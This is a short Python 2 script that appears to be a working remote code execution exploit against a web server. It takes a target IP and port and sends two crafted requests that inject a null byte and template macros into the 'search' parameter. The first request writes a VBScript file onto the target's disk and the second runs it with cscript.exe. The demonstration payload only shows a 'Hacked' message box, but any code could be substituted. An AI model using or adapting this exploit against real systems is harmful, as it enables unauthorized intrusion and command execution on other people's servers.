
import urllib2
import sys

file_path = "C:\Users\Public\script.vbs"
file_code = 'MsgBox("Hacked")'

ip = sys.argv[1]
port = sys.argv[2]

step1 = 'save|' + file_path + '|' + urllib2.quote(file_code)
step2 = 'exec|cscript.exe%20' + urllib2.quote(file_path)

urllib2.urlopen("http://"+ip+":"+port+"/?search=%00{.+"+step1+".}")
 
urllib2.urlopen("http://"+ip+":"+port+"/?search=%00{.+"+step2+".}")